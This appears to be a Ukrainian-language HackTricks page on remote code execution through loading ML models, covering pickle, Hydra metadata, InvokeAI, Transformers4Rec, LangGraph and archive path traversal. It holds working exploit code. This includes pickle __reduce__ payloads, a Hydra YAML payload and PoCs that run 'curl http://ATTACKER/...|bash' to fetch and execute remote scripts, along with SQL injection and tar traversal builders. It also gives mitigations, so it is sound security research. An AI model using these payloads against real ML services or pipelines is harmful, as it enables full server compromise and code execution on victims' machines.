# RCE моделей

{{#include ../banners/hacktricks-training.md}}

## Завантаження моделей для RCE

Моделі Machine Learning зазвичай поширюються в різних форматах, таких як ONNX, TensorFlow, PyTorch тощо. Ці моделі можуть завантажуватися на машини розробників або у production-системи для подальшого використання. Зазвичай моделі не повинні містити шкідливий код, але існують випадки, коли модель може використовуватися для виконання довільного коду в системі як передбачена функція або через вразливість у бібліотеці завантаження моделей.

На момент написання цієї статті прикладами таких вразливостей є:

| **Framework / Tool**        | **Вразливість (CVE, якщо доступний)**                                                    | **Вектор RCE**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Небезпечна десеріалізація в* `torch.load` **(CVE-2025-32434)**                                                              | Шкідливий pickle у checkpoint моделі призводить до виконання коду (обхід захисту `weights_only`)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + завантаження шкідливої моделі спричиняє виконання коду; RCE через Java-десеріалізацію в management API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Небезпечна десеріалізація checkpoint через `torch.load` **(CVE-2025-23298)**                                           | Ненадійний checkpoint запускає pickle reducer під час `load_model_trainer_states_from_checkpoint` → виконання коду в ML worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + небезпечний MessagePack extension hook **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | Керований користувачем ключ `filter` впроваджує синтаксис SQL/JSON-path, `UNION SELECT` створює підроблений рядок checkpoint, після чого десеріалізація `msgpack` імпортує та викликає обраний атакувальником Python-код | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (небезпечний YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Завантаження моделі з YAML використовує `yaml.unsafe_load` (виконання коду) <br> Завантаження моделі з шаром **Lambda** виконує довільний Python-код          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (парсинг TFLite)                                                                                          | Створена спеціально модель `.tflite` викликає переповнення цілого числа → пошкодження heap (потенційний RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Завантаження моделі через `joblib.load` виконує pickle із payload атакувальника в `__reduce__`                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (небезпечний `np.load`) *disputed*                                                                              | Значення за замовчуванням `numpy.load` дозволяло масиви об'єктів із pickle – шкідливий `.npy/.npz` запускає виконання коду                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (обхід директорій) <br> **CVE-2024-5187** (обхід директорій у tar)                                                    | Шлях до external-weights ONNX-моделі може вийти за межі директорії (читання довільних файлів) <br> Шкідливий tar ONNX-моделі може перезаписати довільні файли (що призводить до RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Модель із custom operator потребує завантаження native-коду атакувальника; складні графи моделі зловживають логікою для виконання ненавмисних обчислень   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (обхід шляхів)                                                                                          | Використання model-load API з увімкненим `--model-control` дозволяє обхід відносних шляхів для запису файлів (наприклад, перезаписати `.bashrc` для RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (численні heap overflow)                                                                         | Некоректний файл моделі GGUF спричиняє переповнення heap buffer у parser, уможливлюючи виконання довільного коду в системі жертви                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Шкідлива модель HDF5 (`.h5`) із шаром Lambda все ще виконує код під час завантаження (Keras safe_mode не поширюється на старий формат – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Багато ML-інструментів (наприклад, формати моделей на основі pickle, Python `pickle.load`) виконують довільний код, вбудований у файли моделей, якщо це не пом'якшено | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Ненадійні metadata передаються до `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Керовані атакувальником metadata/config встановлюють `_target_` у довільний callable (наприклад, `builtins.exec`) → виконується під час завантаження навіть із “безпечними” форматами (`.safetensors`, `.nemo`, `config.json` репозиторію) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Крім того, існують моделі на основі Python pickle, наприклад ті, що використовуються [PyTorch](https://github.com/pytorch/pytorch/security), які можуть застосовуватися для виконання довільного коду в системі, якщо їх завантажувати без `weights_only=True`. Отже, будь-яка модель на основі pickle може бути особливо вразливою до такого типу атак, навіть якщо її немає в таблиці вище.

### Metadata Hydra → RCE (працює навіть із safetensors)

`hydra.utils.instantiate()` імпортує та викликає будь-який dotted `_target_` в об'єкті конфігурації/metadata. Коли бібліотеки передають **ненадійні metadata моделі** до `instantiate()`, атакувальник може вказати callable та аргументи, які негайно запускаються під час завантаження моделі (pickle не потрібен).<sup>[[12]](#references)</sup>

Приклад payload (працює в `model_config.yaml` `.nemo`, `config.json` репозиторію або всередині `__metadata__` у `.safetensors`):
```yaml
_target_: builtins.exec
_args_:
- "import os; os.system('curl http://ATTACKER/x|bash')"
```
Ключові моменти:
- Виконується до ініціалізації моделі в NeMo `restore_from/from_pretrained`, кодерах uni2TS HuggingFace і завантажувачах FlexTok.
- Рядковий block-list Hydra можна обійти через альтернативні шляхи імпорту (наприклад, `enum.bltns.eval`) або імена, розв’язані застосунком (наприклад, `nemo.core.classes.common.os.system` → `posix`).
- FlexTok також аналізує рядкові метадані за допомогою `ast.literal_eval`, що дає змогу спричинити DoS (надмірне використання CPU/пам’яті) до виклику Hydra.

### 🆕 RCE в InvokeAI через `torch.load` (CVE-2024-12029)

`InvokeAI` — популярний web-інтерфейс з відкритим кодом для Stable-Diffusion. Версії **5.3.1 – 5.4.2** відкривають REST endpoint `/api/v2/models/install`, який дає змогу користувачам завантажувати та завантажувати моделі з довільних URL.<sup>[[1]](#references)</sup>

Усередині endpoint зрештою викликається:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Коли наданий файл є **PyTorch checkpoint (`*.ckpt`)**, `torch.load` виконує **pickle deserialization**. Оскільки вміст надходить безпосередньо з контрольованого користувачем URL, атакувальник може вбудувати шкідливий об'єкт із власним методом `__reduce__` у checkpoint; цей метод виконується **під час deserialization**, що призводить до **remote code execution (RCE)** на сервері InvokeAI.

Уразливості присвоєно **CVE-2024-12029** (CVSS 9.8, EPSS 61,17 %).

#### Покрокова демонстрація експлуатації

1. Створіть шкідливий checkpoint:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Розмістіть `payload.ckpt` на HTTP-сервері під вашим контролем (наприклад, `http://ATTACKER/payload.ckpt`).
3. Викличте вразливу кінцеву точку (автентифікація не потрібна):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Коли InvokeAI завантажує файл, він викликає `torch.load()` → gadget `os.system` запускається, і attacker отримує виконання коду в контексті процесу InvokeAI.

Готовий exploit: модуль **Metasploit** `exploit/linux/http/invokeai_rce_cve_2024_12029` автоматизує весь процес.<sup>[[3]](#references)</sup>

#### Умови

•  InvokeAI 5.3.1-5.4.2 (прапорець scan за замовчуванням **false**)
•  `/api/v2/models/install` доступний attacker
•  Процес має дозволи на виконання shell-команд

#### Заходи захисту

* Оновіть до **InvokeAI ≥ 5.4.3** – patch встановлює `scan=True` за замовчуванням і виконує malware scanning перед десеріалізацією.
* Під час програмного завантаження checkpoints використовуйте `torch.load(file, weights_only=True)` або новий helper [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).
* Застосовуйте allow-lists / signatures для джерел моделей і запускайте service з мінімально необхідними privileges.

> ⚠️ Пам'ятайте, що будь-який формат на основі Python pickle (зокрема багато файлів `.pt`, `.pkl`, `.ckpt`, `.pth`) за своєю суттю небезпечний для десеріалізації з ненадійних джерел.

---

Приклад ad-hoc mitigation, якщо необхідно продовжити роботу старих версій InvokeAI за reverse proxy:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE через небезпечний `torch.load` (CVE-2025-23298)

NVIDIA Transformers4Rec (частина Merlin) використовував небезпечний завантажувач checkpoint, який безпосередньо викликав `torch.load()` для шляхів, наданих користувачем. Оскільки `torch.load` покладається на Python `pickle`, контрольований зловмисником checkpoint може виконати довільний код через reducer під час десеріалізації.<sup>[[5]](#references)</sup>

Вразливий шлях (до виправлення): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Чому це призводить до RCE: У Python pickle об’єкт може визначити reducer (`__reduce__`/`__setstate__`), який повертає callable і аргументи. Callable виконується під час розпакування. Якщо такий об’єкт присутній у checkpoint, він запускається до використання будь-яких ваг.

Мінімальний приклад шкідливого checkpoint:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Вектори доставки та масштаб ураження:
- Троянізовані checkpoints/models, поширені через repos, buckets або artifact registries
- Автоматизовані resume/deploy pipelines, які автоматично завантажують checkpoints
- Виконання відбувається всередині training/inference workers, часто з підвищеними привілеями (наприклад, root у containers)

Виправлення: commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) замінив прямий виклик `torch.load()` на обмежений десеріалізатор із allow-list, реалізований у `transformers4rec/utils/serialization.py`. Новий loader перевіряє типи/поля та запобігає виклику довільних callable під час завантаження.<sup>[[7]](#references)</sup>

Рекомендації із захисту, специфічні для PyTorch checkpoints:
- Не виконуйте unpickle ненадійних даних. За можливості надавайте перевагу неекз executable форматам, таким як [Safetensors](https://huggingface.co/docs/safetensors/index) або ONNX.
- Якщо необхідно використовувати PyTorch serialization, переконайтеся, що встановлено `weights_only=True` (підтримується в новіших версіях PyTorch), або використовуйте custom allow-listed unpickler, подібний до patch для Transformers4Rec.
- Забезпечте provenance/signatures моделей і виконуйте sandbox десеріалізації (seccomp/AppArmor; non-root user; обмежена FS і відсутність network egress).
- Відстежуйте неочікувані child processes від ML services під час завантаження checkpoint; відстежуйте використання `torch.load()`/`pickle`.

Посилання на POC і vulnerable/patch версії:<sup>[[8]](#references)[[9]](#references)[[10]](#references)</sup>
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Приклад – створення malicious PyTorch model

- Створіть model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Завантажити модель:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Десеріалізація Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent FaceDetection-DSFD надає endpoint `resnet`, який десеріалізує дані, контрольовані користувачем. ZDI підтвердила, що remote attacker може змусити victim завантажити шкідливу сторінку/файл, передати до цього endpoint створений зловмисником serialized blob і запустити десеріалізацію з правами `root`, що призводить до повної компрометації.

Потік exploit повторює типовий pickle abuse:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Будь-який gadget, доступний під час десеріалізації (конструктори, `__setstate__`, callbacks фреймворку тощо), можна weaponize у такий самий спосіб, незалежно від того, чи використовувався транспорт HTTP, WebSocket або файл, переміщений у директорію, за якою ведеться спостереження.



### LangGraph checkpointer SQLi → MessagePack RCE

Цей ланцюжок атаки цікавий тим, що attacker **не потрібно завантажувати malicious model file**. Натомість застосунок відкриває **AI-agent persistence API** (`get_state_history(..., filter=...)`), а user input потрапляє до query builder checkpointer.

#### 1. Structural SQLi у metadata filters

Вразливий SQLite pattern виглядав так:
```python
for query_key, query_value in filter.items():
operator, param_value = _where_value(query_value)
predicates.append(
f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
)
```
Значення прив'язується пізніше, але `query_key` конкатенується в **рядок JSON path**, тому `'` всередині ключа словника виходить за межі `'$.{query_key}'` і впроваджує SQL. Той самий принцип застосовується до **JSON paths, identifiers, operators, `LIMIT` і TTL fields**: placeholders захищають лише значення, але не структурний синтаксис запиту.

#### 2. `UNION SELECT` може націлюватися на downstream sinks, а не лише на викрадення даних

Запит повертає `type` і серіалізовані байти `checkpoint`, які згодом використовуються як:
```python
self.serde.loads_typed((type, checkpoint))
```
Це означає, що SQLi у клаузі `WHERE` може впровадити **фальшивий рядок результату**:
```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```
Якщо подальший код аналізує, десеріалізує, записує або виконує будь-який вибраний стовпець, зіставте ці стовпці з відповідними sinks. У цьому випадку фальшивий рядок перетворює SQLi на **десеріалізацію, контрольовану атакером**.

#### 3. Небезпечні extension hooks у MessagePack еквівалентні code gadgets

Шлях `msgpack` у LangGraph використовував custom extension hook, який розпаковував вкладений кортеж і виконував:
```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```
Отже, об’єкт розширення MessagePack, що кодує щось еквівалентне `("os", "system", "id > /tmp/pwned")`, імпортує `os`, знаходить `system` і виконує команду. Під час аудиту AI-фреймворків перевіряйте **власні MessagePack/JSON/pickle revivers** на наявність динамічного імпорту, reflection або довільного виклику callable.

#### 4. Практичний шаблон аудиту для agent frameworks

Перевіряйте будь-які контрольовані користувачем вхідні дані, які потрапляють до:
- API для history / memory / replay / checkpoint listing стану
- структурованих конструкторів фільтрів, що генерують фрагменти SQL або Redis-запитів
- власних deserializer-ів (`pickle`, `msgpack`, `json` object hooks, YAML constructors)
- шляхів відновлення, які довіряють рядкам, отриманим із persistence layer

Цей конкретний ланцюжок зачепив self-hosted розгортання LangGraph, що використовували **SQLite** або **Redis** checkpointers, коли ненадійні користувачі могли контролювати `filter`. У розкритті зазначено такі patched versions: `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+` і `langgraph-checkpoint 4.0.1+`.<sup>[[15]](#references)</sup>

## Models to Path Traversal

Як зазначено в [**цьому дописі в блозі**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), більшість форматів моделей, які використовують різні AI-фреймворки, базуються на архівах, зазвичай `.zip`. Тому ці формати можна використати для виконання атак Path Traversal, що дає змогу читати довільні файли із системи, у якій завантажено модель.<sup>[[16]](#references)</sup>

Наприклад, за допомогою наведеного нижче коду можна створити модель, яка під час завантаження створить файл у директорії `/tmp`:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Або за допомогою наведеного нижче коду можна створити модель, яка під час завантаження створить символічне посилання на каталог `/tmp`:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Поглиблений розбір: десеріалізація Keras .keras і пошук gadget

Для детального посібника з внутрішньої будови .keras, RCE через Lambda-layer, проблеми довільного імпорту у версіях ≤ 3.8 і пошуку gadget після виправлення всередині allowlist дивіться:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Посилання

- [1] [Блог OffSec – "CVE-2024-12029 – десеріалізація ненадійних даних у InvokeAI"](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [Коміт виправлення InvokeAI 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Документація модуля Rapid7 Metasploit](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – міркування щодо безпеки torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [Блог ZDI – CVE-2025-23298: отримання RCE у NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [Рекомендації ZDI: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Коміт виправлення Transformers4Rec b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Вразливий loader до виправлення (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [PoC шкідливого checkpoint (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Loader після виправлення (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – RCE за допомогою сучасних форматів і бібліотек AI/ML](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Документація Hydra instantiate](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Коміт block-list Hydra (попередження про RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – від SQLi до RCE: експлуатація checkpointer LangGraph](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Перетворення помилок Archive Slip на високоцінні AI/ML bounty](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)

{{#include ../banners/hacktricks-training.md}}
